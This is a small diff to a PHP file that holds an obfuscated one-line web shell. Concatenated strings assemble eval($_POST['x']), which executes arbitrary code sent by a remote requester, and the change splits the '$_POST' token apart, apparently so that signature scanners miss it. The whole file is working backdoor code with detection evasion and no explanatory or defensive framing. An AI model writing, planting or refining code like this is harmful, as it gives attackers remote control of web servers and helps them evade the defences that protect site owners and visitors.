@@ -1,5 +1,6 @@
 <?php
 function bypass(){
-    return "l(\$_POST['";
+	$x = "\$_PO";
+    return "l(".$x."ST['";
 }
 eval("eva".bypass()."x']);");
